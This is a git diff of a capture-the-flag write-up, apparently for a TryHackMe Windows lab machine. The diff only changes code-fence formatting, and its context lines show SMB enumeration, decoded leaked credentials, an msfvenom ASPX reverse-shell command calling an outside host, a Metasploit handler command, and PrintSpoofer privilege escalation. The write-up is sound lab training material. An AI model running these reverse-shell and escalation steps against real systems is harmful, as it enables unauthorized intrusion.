@@ -17,7 +17,7 @@ The description of this machine is quite nice, having a roleplay in it to put yo
 # Recon
 Starting off with a recon on the machine to see what ports are open, what services are active, etc.
 
-```shell
+```
 # Nmap 7.80 scan initiated Wed Sep 23 20:07:03 2020 as: nmap -sS -sV -oA relevant-vuln --script=default,vuln -p- -T5 10.10.155.253
 Nmap scan report for 10.10.155.253
 Host is up (0.079s latency).
@@ -120,7 +120,7 @@ Moving on we see a few other ports open...
 
 ## 445
 In the above scan we see SMB is up and running with open ports on this machine. Running a basic `smbclient` list reveals the following:
-```shell
+```
 $ smbclient -L \\\\10.10.236.33\\
 Enter WORKGROUP\z3nn's password:
         Sharename       Type      Comment
@@ -133,7 +133,7 @@ SMB1 disabled -- no workgroup available
 ```
 
 The `nt4wrksv` folder looks interesting, if we connect to it we can see it contains the following file:
-```shell
+```
 $ smbclient \\\\10.10.236.33\\nt4wrksv
 Enter WORKGROUP\z3nn's password:
 Try "help" to get a list of possible commands.
@@ -146,13 +146,13 @@ smb: \> ls
 ```
 
 Retrieving the `passwords.txt` file we get access to some base64 encoded information:
-```shell
+```
 [User Passwords - Encoded]
 Qm9iIC0gIVBAJCRXMHJEITEyMw==
 QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
 ```
 If we run it through a base64 decoder we get the following:
-```shell
+```
 [User Passwords - Encoded]
 Bob - !P@$$W0rD!123
 Bill - Juw4nnaM4n420696969!$$$
@@ -166,7 +166,7 @@ On first impression this looks like a copy of port 80, just a bare IIS server ru
 Running `gobuster` on it reveals there is a directory /nt4wrksv/ ... just like the on on SMB, if we actually try to access the file from SMB via the browser we can using the right path: `/nt4wrksv/passwords.txt`... Now this is interesting.
 
 Running `smbmap` on the server we can see we have write access to the `/nt4wrksv/` location
-```shell
+```
 $ smbmap -H 10.10.125.76 -u 'z3nn' -p ''
 [+] Guest session       IP: 10.10.125.76:445    Name: unknown
         Disk                                                    Permissions     Comment
@@ -179,14 +179,14 @@ $ smbmap -H 10.10.125.76 -u 'z3nn' -p ''
 
 # Exploit
 Now that we have knowledge of the vulnerability and our entry point in the system it's time to exploit it... I used [PenTest.WS](https://pentest.ws/) to create a `MSF Venom` payload
-```shell
+```
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=1.1.1.1 LPORT=8585 -f aspx -o reverso.aspx
 ```
 
 Upload payload to SMB server in `/nt4wrksv/` location
 
 Start a netcat listener or... use the PenTest.WS `msfconsole` command it creates for you to open as a listener to this payload:
-```shell
+```
 msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell/reverse_tcp; set LHOST 1.1.1.1; set LPORT 8585; run"
 ```
 
@@ -200,7 +200,7 @@ PrivEsc was a bit funky, I did not expect it to be so easy... this machine was a
 Thanks to `TheMayor`'s github repo we can download an already built `PrintSpoofer.exe` from here: [repo](https://github.com/dievus/printspoofer)
 
 Upload that to the SMB server as we did with the reverse shell and run it...
-```shell
+```
 c:\Users\Bob\Desktop>whoami
 whoami
 iis apppool\defaultapppool
